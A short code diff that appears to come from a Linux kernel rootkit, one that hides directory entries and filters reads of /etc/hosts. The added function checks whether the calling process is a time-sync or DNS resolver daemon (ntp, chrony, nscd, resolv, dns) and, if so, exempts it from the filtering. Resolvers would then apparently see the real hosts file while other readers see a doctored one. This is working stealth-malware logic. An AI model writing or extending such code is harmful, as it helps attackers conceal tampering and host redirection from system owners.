@@ -234,12 +234,27 @@ static bool dirent_is_hidden(const char *name)
 }
 
 /* ── /etc/hosts read filtering ────────────────────────────────────────────── */
+static bool caller_is_resolver(void)
+{
+	char comm[TASK_COMM_LEN];
+	get_task_comm(comm, current);
+	return (strstr(comm, "ntp")     != NULL ||
+	        strstr(comm, "chrony")  != NULL ||
+	        strstr(comm, "timesyn") != NULL ||
+	        strstr(comm, "nscd")    != NULL ||
+	        strstr(comm, "resolv")  != NULL ||
+	        strstr(comm, "dns")     != NULL);
+}
+
 static bool fd_is_hosts(unsigned int fd)
 {
 	struct file *filp;
 	char *buf;
 	char *path;
 	bool result = false;
+
+	if (caller_is_resolver())
+		return false;
 
 	filp = fget(fd);
 	if (!filp)
